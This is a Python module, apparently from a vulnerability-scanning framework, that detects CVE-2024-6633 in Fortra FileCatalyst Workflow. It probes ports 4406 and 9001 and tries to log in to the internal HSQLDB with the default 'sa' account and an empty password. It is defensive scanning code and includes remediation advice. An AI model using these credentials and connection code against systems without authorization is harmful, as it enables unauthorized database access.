"""Agent Asteroid implementation for CVE-2024-6633"""

import logging
import socket

import jaydebeapi
from ostorlab.agent.kb import kb
from ostorlab.agent.mixins import agent_report_vulnerability_mixin

from agent import definitions
from agent import exploits_registry

VULNERABILITY_TITLE = "Default Credentials in Fortra FileCatalyst Workflow HSQLDB"
VULNERABILITY_REFERENCE = "CVE-2024-6633"
VULNERABILITY_DESCRIPTION = (
    "Fortra FileCatalyst Workflow versions less than 5.1.7 are vulnerable to a critical issue where "
    "default credentials for the internal HSQLDB are exposed. Attackers can exploit this by accessing "
    "the database remotely using these credentials via TCP ports 4406 and 9001."
)

DEFAULT_PORTS = [4406, 9001]
DEFAULT_USER = "sa"
DEFAULT_PASSWORD = ""

logger = logging.getLogger(__name__)


def _create_vulnerability(target: definitions.Target) -> definitions.Vulnerability:
    """Creates a vulnerability report based on the detection."""
    entry = kb.Entry(
        title=VULNERABILITY_TITLE,
        risk_rating="CRITICAL",
        short_description=VULNERABILITY_DESCRIPTION,
        description=VULNERABILITY_DESCRIPTION,
        references={
            "nvd.nist.gov": f"https://nvd.nist.gov/vuln/detail/{VULNERABILITY_REFERENCE}",
        },
        recommendation=(
            "- Upgrade FileCatalyst Workflow to version 5.1.7 or later.\n"
            "- Restrict access to TCP ports 4406 and 9001 from untrusted sources.\n"
            "- Monitor database access and consider replacing the default HSQLDB."
        ),
        security_issue=True,
        privacy_issue=False,
        has_public_exploit=False,
        targeted_by_malware=False,
        targeted_by_ransomware=False,
        targeted_by_nation_state=False,
    )
    technical_detail = (
        f"{target.url} is vulnerable to {VULNERABILITY_REFERENCE}: "
        f"{VULNERABILITY_TITLE}"
    )
    return definitions.Vulnerability(
        entry=entry,
        technical_detail=technical_detail,
        risk_rating=agent_report_vulnerability_mixin.RiskRating.CRITICAL,
    )


def _is_port_open(host: str, port: int) -> bool:
    """Check if the specified port is open on the target host."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        result = s.connect_ex((host, port))
        s.close()
        return result == 0
    except socket.error as error:
        logger.error("Socket error occurred while checking port %s: %s", port, error)
        return False


def _attempt_db_connection(db_host: str, port: int) -> bool:
    """Attempt to connect to the database using the specified port."""
    try:
        conn = jaydebeapi.connect(
            "org.hsqldb.jdbcDriver",
            f"jdbc:hsqldb:hsql://{db_host}:{port}/hsqldb",
            [DEFAULT_USER, DEFAULT_PASSWORD],
            "../Resources/hsqldb.jar",
        )
        conn.close()
        return True

    except jaydebeapi.DatabaseError as e:
        logger.error("Database error occurred while connecting: %s", e)
        return False
    # It was handled like that because the error is coming from a java class java.sql.SQLTransientConnectionException.
    except Exception as e:
        logger.error("Unexpected error occurred: %s", e)
        return False


def _detect_vulnerability(host: str) -> bool:
    """Detects if the target host is vulnerable to CVE-2024-6633."""
    for port in DEFAULT_PORTS:
        if _is_port_open(host, port) is True:
            logger.debug("Port %s is open. Attempting to connect...", port)
            if _attempt_db_connection(host, port) is True:
                logger.debug(
                    "Vulnerable: Default HSQLDB credentials are active and accessible on port %s.",
                    port,
                )
                return True
            else:
                logger.debug(
                    "Port %s is open but could not connect with default credentials.",
                    port,
                )
        else:
            logger.debug("Port %s is not open. Host may not be vulnerable.", port)
    return False


@exploits_registry.register
class CVE20246633Exploit(definitions.Exploit):
    """Exploit for CVE-2024-6633: Default Credentials in Fortra FileCatalyst Workflow HSQLDB"""

    def accept(self, target: definitions.Target) -> bool:
        """Check if the target is valid for this exploit."""
        return any(_is_port_open(target.host, port) for port in DEFAULT_PORTS)

    def check(self, target: definitions.Target) -> list[definitions.Vulnerability]:
        """Checks for vulnerabilities in the target."""
        vulnerabilities = []

        if _detect_vulnerability(target.host) is True:
            vulnerabilities.append(_create_vulnerability(target))

        return vulnerabilities
